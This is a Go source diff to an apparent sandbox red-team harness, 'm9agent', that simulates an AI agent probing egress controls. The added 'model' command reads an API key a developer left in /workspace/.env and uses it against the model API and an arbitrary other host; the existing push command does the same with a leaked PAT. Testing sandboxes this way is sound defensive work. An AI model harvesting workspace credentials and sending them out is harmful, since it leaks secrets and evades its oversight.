@@ -6,6 +6,7 @@
 // the sandbox's proxy, and prints one line per attempt.
 //
 //	m9agent merge OWNER/REPO NUMBER SHA [N]   N raw PUTs (default 1) to the pull request's merge endpoint, as curl would
+//	m9agent model OTHER-HOST              calls its model at api.anthropic.com with its placeholder key, then with the key found in /workspace/.env, then at OTHER-HOST (G0 M29)
 //	m9agent push OWNER/REPO               writes /workspace/fix.txt, then the PAT found in /workspace/.env: a git push over HTTPS, the API with it, and SSH
 package main
 
@@ -46,7 +47,44 @@ func main() {
 		}
 	case "push":
 		push(os.Args[2])
+	case "model":
+		model(os.Args[2])
 	}
+}
+
+// model calls the agent's model as an SDK would (G0 M29 RT-190, RT-191):
+// with the key the sandbox put in ANTHROPIC_API_KEY (a placeholder), with
+// the key a developer left in the workspace's .env, and at another model
+// host, which no connection maps.
+func model(other string) {
+	body := `{"model":"sim-model","max_tokens":16,"messages":[{"role":"user","content":"Say hi."}]}`
+	own := foundVar("ANTHROPIC_KEY=")
+	call := func(label, host, key string) {
+		req, _ := http.NewRequest(http.MethodPost, "https://"+host+"/v1/messages", strings.NewReader(body)) //nolint:noctx // a one-shot agent
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("Anthropic-Version", "2023-06-01")
+		req.Header.Set("X-Api-Key", key)
+		fmt.Println(label, answer(client.Do(req)))
+	}
+	call("model-placeholder", "api.anthropic.com", os.Getenv("ANTHROPIC_API_KEY"))
+	call("model-own-key", "api.anthropic.com", own)
+	call("model-other", other, own)
+}
+
+// foundVar reads a variable a developer left in the workspace's .env.
+func foundVar(prefix string) string {
+	f, err := os.Open("/workspace/.env")
+	if err != nil {
+		return ""
+	}
+	defer func() { _ = f.Close() }()
+	sc := bufio.NewScanner(f)
+	for sc.Scan() {
+		if v, ok := strings.CutPrefix(sc.Text(), prefix); ok {
+			return strings.TrimSpace(v)
+		}
+	}
+	return ""
 }
 
 func merge(repo, number, sha string) {
